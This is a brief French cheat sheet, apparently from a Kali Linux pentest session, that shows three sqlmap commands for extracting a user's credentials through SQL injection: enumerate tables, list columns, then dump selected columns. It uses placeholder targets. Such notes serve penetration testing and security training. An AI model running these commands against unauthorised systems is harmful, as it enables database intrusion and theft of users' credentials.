Retrouver les identifiants d'un utilisateur d'une base de données

1. Identifiez le nom de la table concerné

( root@kali )-[ /home/user ]
sqlmap -u URL?parameter=value -D nom_base --tables --batch

2. Affichez les colonnes de la tables sélectionné

( root@kali )-[ /home/user ]
sqlmap -u URL?parameter=value -D nom_base -T nom_table --columns --batch

3. Affichez les données des colonnes sélectionnées de la table

( root@kali )-[ /home/user ]
sqlmap -u URL?parameter=value -D nom_base -T nom_table -C nom_colonne1, nom_colonneN --dump --batch
